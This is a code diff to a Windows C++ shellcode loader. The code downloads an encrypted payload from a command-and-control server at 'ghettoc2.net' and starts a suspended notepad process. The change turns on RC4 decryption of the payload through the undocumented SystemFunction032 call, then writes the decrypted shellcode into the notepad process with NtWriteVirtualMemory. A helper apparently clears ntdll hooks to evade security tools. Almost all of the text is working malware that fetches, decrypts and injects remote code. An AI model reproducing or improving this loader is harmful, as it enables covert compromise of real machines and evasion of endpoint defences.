@@ -9,6 +9,8 @@
 
 #define DEBUGGING 1
 
+#define MAXSHELLCODESIZE 4096
+
 #define _CRT_SECURE_NO_DEPRECATE
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
@@ -18,14 +20,14 @@
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
 BOOL ClearNTDLL();
 
-// For systemfunction033 (built in RC4 decrypt)
-typedef NTSTATUS(WINAPI* _SystemFunction033)(
+// For systemfunction032 (built in RC4 decrypt)
+typedef NTSTATUS(WINAPI* _SystemFunction032)(
     struct ustring* memoryRegion,
     struct ustring* keyPointer);
 
 struct ustring {
-    DWORD Length;
-    DWORD MaximumLength;
+    USHORT Length;
+    USHORT MaximumLength;
     PUCHAR Buffer;
 } _data, key;
 
@@ -137,22 +139,28 @@ int main()
     getchar();
 #endif
 
-    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
+    _SystemFunction032 SystemFunction032 = (_SystemFunction032)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction032");
 
-    NTSTATUS  ntstatus;
-    LPVOID    start_address = NULL;
-    SIZE_T    code_size;
-    DWORD     oldProtect = NULL;
+    NTSTATUS        ntstatus;
+    LPVOID          start_address = NULL;
+    SIZE_T          code_size;
+    DWORD           oldProtect = NULL;
+    unsigned char   buf[MAXSHELLCODESIZE];
 
 #ifdef DEBUGGING
     printf("Starting download\n");
 #endif
     std::vector<BYTE> shellcode = Download(L"ghettoc2.net\0", L"/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/loader.enc\0");
+
+    USHORT shellcode_size = (unsigned int)shellcode.size();
 #ifdef DEBUGGING
-    printf("Finished download\n");
+    printf("Finished download, shellcode size is %d\n", shellcode_size);
 #endif
 
-    unsigned int shellcode_size = (unsigned int)shellcode.size();
+    if (shellcode_size > MAXSHELLCODESIZE) {
+        fprintf(stderr, "Shellcode too big (%d bytes), max size is %d bytes\n", shellcode_size, MAXSHELLCODESIZE);
+        return 0;
+    }
 
     // create startup info struct
     LPSTARTUPINFOW startup_info = new STARTUPINFOW();
@@ -179,7 +187,7 @@ int main()
         process_info);
 
 #ifdef DEBUGGING
-    printf("Started a suspended notepad, check with processhacker or taskmanager and then press enter to continue...\n");
+    printf("Started a suspended notepad, pid %d, check with processhacker or taskmanager and then press enter to continue...\n", GetProcessId(process_info->hProcess));
     getchar();
 #endif
 
@@ -200,23 +208,23 @@ int main()
 #endif
     }
 
-/*
-    // decrypt the downloaded shellcode with SystemFunction033
-    key.Buffer = (PUCHAR)(&mykey);
-    key.Length = sizeof key;
-    _data.Buffer = (PUCHAR)(& shellcode[0]);
-    _data.Length = shellcode_size;
+    memcpy(buf, &shellcode[0], shellcode_size);
 
-//    SystemFunction033(&_data, &key);
+    // decrypt the downloaded shellcode with SystemFunction032
+    key.Buffer = (PUCHAR)(&mykey);
+    key.Length = (USHORT)(sizeof key);
+    _data.Buffer = (PUCHAR)&buf;
+    _data.Length = (USHORT)shellcode_size;
+
+    SystemFunction032(&_data, &key);
 
 #ifdef DEBUGGING
     printf("Decrypted, press enter to continue..., shellcode size is now %d\n", shellcode_size);
     getchar();
 #endif
-*/
 
     // Copy shellcode into allocated memory
-    ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)(&shellcode[0]), shellcode_size, 0);
+    ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
     if (!NT_SUCCESS(ntstatus)) {
 #ifdef DEBUGGING
         fprintf(stderr, "NtWriteVirtualMemory error, ntstatus is %x\n", (unsigned int)ntstatus);
